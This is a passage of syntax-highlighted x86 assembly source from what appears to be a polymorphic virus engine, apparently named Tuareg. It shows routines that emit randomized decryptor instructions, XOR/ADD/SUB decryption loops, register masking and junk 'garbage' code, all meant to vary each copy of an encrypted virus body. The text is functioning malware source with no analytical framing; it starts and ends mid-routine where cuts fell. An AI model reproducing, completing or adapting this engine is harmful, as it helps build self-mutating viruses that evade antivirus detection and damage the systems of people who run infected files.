</span><span class="sc5">SelectARegisterWithInit</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SelectARegister</span><span class="sc0"> </span><span class="sc1">; Call to the register selection</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SelectReg_Common</span><span class="sc0"> </span><span class="sc1">; Jump to the register initialization</span><span class="sc0">
                                         </span><span class="sc1">; common part of the function above</span><span class="sc0">
</span><span class="sc5">SelectARegisterWithInit</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function makes the instructions to modify the Index1 register</span><span class="sc0">
</span><span class="sc5">ModifyIndex1</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Modifier</span><span class="sc4">]</span><span class="sc0">
  </span><span class="sc5">ModifyNdxReg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADD</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ModifyIndex1</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function makes the instructions to modify the Index2 register</span><span class="sc0">
</span><span class="sc5">ModifyIndex2</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Modifier</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ModifyNdxReg</span><span class="sc0">
</span><span class="sc5">ModifyIndex2</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function makes the instructions to mask the Index1 with AND</span><span class="sc0">
</span><span class="sc5">MaskIndex1</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_SizePOW2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc4">(</span><span class="sc5">Virus_SizePOW2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc4">(</span><span class="sc5">Virus_SizePOW2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; ECX=The pure mask with random bits</span><span class="sc0">
                                     </span><span class="sc1">; where in the register to mask will be</span><span class="sc0">
                                     </span><span class="sc1">; always 0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">MaskNdxReg</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@EAX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E081h</span><span class="sc0">   </span><span class="sc1">; AND Reg,Value</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@InsertValue</span><span class="sc0">
       </span><span class="sc5">@@EAX</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">      </span><span class="sc1">; AND EAX,Value</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                </span><span class="sc1">; Store the opcode</span><span class="sc0">
</span><span class="sc5">@@InsertValue</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">                </span><span class="sc1">; Store the masking value</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">  </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                  </span><span class="sc1">; Return</span><span class="sc0">
</span><span class="sc5">MaskIndex1</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function makes the instructions to mask the Index2 with AND</span><span class="sc0">
</span><span class="sc5">MaskIndex2</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_SizePOW2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc4">(</span><span class="sc5">Virus_SizePOW2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc4">(</span><span class="sc5">Virus_SizePOW2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; ECX=Mask with random bits</span><span class="sc0">
                                                 </span><span class="sc1">; where in the register to</span><span class="sc0">
                                                 </span><span class="sc1">; mask will be 0</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">MaskNdxReg</span><span class="sc0"> </span><span class="sc1">; Jump to the common part</span><span class="sc0">
</span><span class="sc5">MaskIndex2</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function is common when doing the "functional" code in the branch.</span><span class="sc0">
</span><span class="sc1">;; What it does is to XOR the Index2 with the Index1, do garbage, make the</span><span class="sc0">
</span><span class="sc1">;; code to decrypt and do more garbage.</span><span class="sc0">
</span><span class="sc5">Patch1</span><span class="sc0">          </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index1Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoXORRegReg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InsertDecryption</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Patch1</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; This function construct code for the decryption operation. It can make a</span><span class="sc0">
</span><span class="sc1">;; wide variety of methods, using one or two registers inside the brackets,</span><span class="sc0">
</span><span class="sc1">;; and using a direct value or a register to decrypt. The decryption is XOR,</span><span class="sc0">
</span><span class="sc1">;; ADD or SUB. No in vane, it's one of the largest functions in this engine.</span><span class="sc0">
</span><span class="sc5">InsertDecryption</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TuaregFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Use register for key?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@WithKeyReg</span><span class="sc0">                    </span><span class="sc1">; Then jump to there</span><span class="sc0">

    </span><span class="sc1">;; Here we'll construct a XOR/ADD/SUB DWORD PTR [Address], DirectValue</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptType</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc1">; Make XOR, ADD or SUB</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@PutSUBValue</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@PutADDValue</span><span class="sc0">
 </span><span class="sc5">@@PutXORValue</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc0">     </span><span class="sc1">; XOR 2nd opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@PutValue</span><span class="sc0">
 </span><span class="sc5">@@PutSUBValue</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A8h</span><span class="sc0">     </span><span class="sc1">; SUB 2nd opcode</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@PutValue</span><span class="sc0">
 </span><span class="sc5">@@PutADDValue</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">      </span><span class="sc1">; ADD 2nd opcode (the instruction is re-</span><span class="sc0">
                                     </span><span class="sc1">; presented on the bits 6-5-4). And we</span><span class="sc0">
                                     </span><span class="sc1">; set the two highest bits to 1-0, to</span><span class="sc0">
                                     </span><span class="sc1">; activate a dword adding to the register</span><span class="sc0">
                                     </span><span class="sc1">; inside the brackets</span><span class="sc0">
    </span><span class="sc5">@@PutValue</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">81h</span><span class="sc0">      </span><span class="sc1">; Main opcode</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TuaregFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0"> </span><span class="sc1">; Use buffer register?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@NoBufferReg</span><span class="sc0">          </span><span class="sc1">; If not, use Index2</span><span class="sc0">
      </span><span class="sc1">;; Here we made XOR/ADD/SUB DWORD PTR [BufferReg+AddingValue], KeyValue</span><span class="sc0">
      </span><span class="sc5">@@WithBufferReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Select buffer reg.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">   </span><span class="sc1">; Do we modify the buffer register B4?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoAdditionalAddition</span><span class="sc0"> </span><span class="sc1">; If not, store directly the</span><span class="sc0">
                                           </span><span class="sc1">; encrypted data begin address as</span><span class="sc0">
                                           </span><span class="sc1">; addition</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Save opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">   </span><span class="sc1">; Get a random value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Get the buffer reg.</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADD</span><span class="sc0">   </span><span class="sc1">; Do an ADD Reg,Value instruction (or similar)</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc1">; to add a random value, and some gar-</span><span class="sc0">
                                        </span><span class="sc1">; bage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">; EAX=Opcode, EBX=Additional addition</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">            </span><span class="sc1">; Store opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Subtract to the</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; address addition the random ADDed to the</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">; buffer register and store it as addition</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next_01</span><span class="sc0">     </span><span class="sc1">; inside the brackets, and jump</span><span class="sc0">
      </span><span class="sc5">@@NoAdditionalAddition</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Store this</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">; address directly (without modifications)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next_01</span><span class="sc0">     </span><span class="sc1">; Jump</span><span class="sc0">
      </span><span class="sc5">@@NoBufferReg</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Bind the reg. to</span><span class="sc0">
                                                          </span><span class="sc1">; the opcode</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">         </span><span class="sc1">; Randomly select if we modify the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NoAdditionalAddition</span><span class="sc0"> </span><span class="sc1">;addition or we store the decrypt</span><span class="sc0">
                                             </span><span class="sc1">; data begin address directly</span><span class="sc0">
                </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TuaregFlags</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; PUSH/Decrypt/POP?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@UseBufferRegister</span><span class="sc0">    </span><span class="sc1">;  If not, we modify buffer reg</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0">       </span><span class="sc1">; Randomly we select to modify the</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@UseBufferRegister</span><span class="sc0"> </span><span class="sc1">; buffer register or Index2 register</span><span class="sc0">
                                          </span><span class="sc1">; (since we push it and pop it later,</span><span class="sc0">
                                          </span><span class="sc1">; we can modify it)</span><span class="sc0">
          </span><span class="sc5">@@UseIndexRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">   </span><span class="sc1">; Get a random value to add</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoADD</span><span class="sc0">           </span><span class="sc1">; Make an ADD with that random value</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; Adjust the addition</span><span class="sc0">
                </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">; Store the addition</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Next_01</span><span class="sc0">         </span><span class="sc1">; Jump to complete the instruction</span><span class="sc0">
   </span><span class="sc1">;; Here we are going to make a MOV BufferReg,RandomValue. Then, inside the</span><span class="sc0">
   </span><span class="sc1">;; decryption instruction, we'll use double index instead one index:</span><span class="sc0">
   </span><span class="sc1">;; XOR/ADD/SUB DWORD PTR [Index2Reg+BufferReg+Dword_Addition], KeyValue</span><span class="sc0">
          </span><span class="sc5">@@UseBufferRegister</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">          </span><span class="sc1">; Get a random value</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BufferRegister</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoMOV</span><span class="sc0">        </span><span class="sc1">; Move that value to the buffer register</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoRandomGarbage</span><span class="sc0"> </span><span class="sc1">; Make garbage</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; Pop the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">  </span><span class="sc1">; Recode the 2nd opcode to insert a 3rd</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">             </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Index2Register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the Index2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RandomFlags</span><span class="sc0"> </span><span class="sc1">; 50% of probability to jump</span><span class="sc0">
                </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RJ_01</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">    </span><span class="sc1">; Exchange the two registers (the order</span><span class="sc0">
                                  </span><span class="sc1">; doesn't matter)</span><span class="sc0">
       </span><span class="sc5">@@RJ_01</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">     </span><span class="sc1">; Construct the opcode using the Index2 reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc0">    </span><span class="sc1">; and the buffer reg</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@RJ_99</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Random</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@RJ_98</span><span class="sc0">
       </span><span class="sc5">@@RJ_99</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">             </span><span class="sc1">; Store the third opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EncryptedDataBeginAddress</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; Calculate the addition</span><span class="sc0">
